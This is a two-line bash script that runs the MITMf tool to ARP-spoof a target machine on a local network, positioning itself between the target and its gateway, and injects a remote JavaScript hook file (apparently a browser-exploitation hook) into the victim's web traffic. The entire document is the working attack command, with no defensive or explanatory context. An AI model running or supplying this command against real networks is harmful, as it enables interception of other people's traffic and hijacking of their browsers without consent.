#!/usr/bin/env bash

#MITM ARP attack with web js injection
mitmf --spoof -i wlan0 --spoof --arp --target 10.0.0.14 --gateway 10.0.0.1 --inject --js-url 10.0.0.14:3000/hook.js
